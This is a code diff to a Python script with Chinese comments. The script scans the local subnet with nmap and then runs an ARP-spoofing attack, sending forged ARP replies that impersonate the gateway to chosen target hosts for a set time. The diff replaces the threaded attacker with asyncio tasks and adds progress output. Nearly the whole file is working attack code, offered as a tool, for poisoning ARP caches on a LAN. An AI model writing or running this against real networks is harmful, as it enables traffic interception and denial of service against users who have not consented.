@@ -1,10 +1,16 @@
 import os
 import time
+import asyncio
 import subprocess
 from threading import Thread
 
-from scapy.all import getmacbyip, sendp, Ether, ARP
+
 import netifaces
+from scapy.all import getmacbyip
+from scapy.all import sendp
+from scapy.all import send
+from scapy.all import Ether
+from scapy.all import ARP
 
 
 def get_routing_nicname():
@@ -37,13 +43,16 @@ def cach_ip(cmd, delay_time):
         :param delay_time: nmap扫描时长
     '''
     p = subprocess.Popen(cmd, shell=True)
-    time.sleep(delay_time)
+    for i in range(int(delay_time), 0, -1):
+        print("剩余%d(s)" % i)
+        time.sleep(1)
     p.kill()
 
 
 def get_ip_list():
-    '''获取当前网关下所有ip'''
+    '''获取当前网关下所有ip与mac'''
 
+    start_time = time.time()
     gtw_ip_list = get_gateway_ip().split('.')
 
     nmap_ips = []
@@ -64,14 +73,40 @@ def get_ip_list():
     for thread in nmap_threads:
         thread.start()
 
+    for thread in nmap_threads:
+        thread.join()
+
     print("正在等待扫描结果.....")
 
     print('***********************************************************')
     p = os.popen("arp -a")  # 获取arp缓存表
     raw_info_list = p.read().split(' ')
+    # print(raw_info_list)
     result_list = [item.strip('(').strip(')')
                    for item in raw_info_list if '(' and ')' in item and item[1] != 'i']
+    print("ip地址获取成功，用时: ", time.time() - start_time)
     return result_list
+
+
+async def attacker(arp, attack_time):
+    ''' 开始攻击
+    :param ether: ARPSpoofer.arpspoof方法传递
+    :param attack_time: ARPSpoofer.arpspoof方法传递
+    '''
+    start_time = time.time()
+    await asyncio.sleep(0.01)
+    try:
+        while time.time() - start_time < attack_time:
+            print("sending......")
+            send(arp)
+    except Exception as e:
+        print(e)
+    # exit()
+
+
+async def attacker_runner(tasks):
+    '''attacker携程启动入口'''
+    await asyncio.gather(*tasks)
 
 
 def arpspoof(gateway_ip, self_ip, attack_time, *target_ip):
@@ -85,37 +120,20 @@ def arpspoof(gateway_ip, self_ip, attack_time, *target_ip):
     assert type(attack_time) == int, \
         '''the type of attack_time must by int'''
 
-    attacker_threads = []
+    attacker_task = []
     for ip in target_ip:
         self_mac = getmacbyip(self_ip)
         tgt_mac = getmacbyip(ip)
         # print("self_mac: ", self_mac)
-        ether = Ether(src=self_mac, dst=tgt_mac)
+        # ether = Ether(src=self_mac, dst=tgt_mac)
         arp = ARP(hwsrc=self_mac, hwdst=tgt_mac,
                   psrc=gateway_ip, pdst=ip, op=2)
 
-        for _ in range(30):
-            attacker_threads.append(
-                Thread(target=attacker, args=(ether, arp, attack_time)))
+        attacker_task.append(attacker(arp, attack_time))
 
-    for thread in attacker_threads:
-        thread.start()
-
-    for thread in attacker_threads:
-        thread.join()
-
+    asyncio.run(attacker_runner(attacker_task))
     return
 
 
-def attacker(ether, arp, attack_time):
-    ''' 开始攻击
-    :param ether: ARPSpoofer.arpspoof方法传递
-    :param attack_time: ARPSpoofer.arpspoof方法传递
-    '''
-    start_time = time.time()
-    try:
-        while time.time() - start_time < attack_time:
-            sendp(ether / arp)
-    except Exception as e:
-        print(e)
-    exit()
+if __name__ == "__main__":
+    get_ip_list()
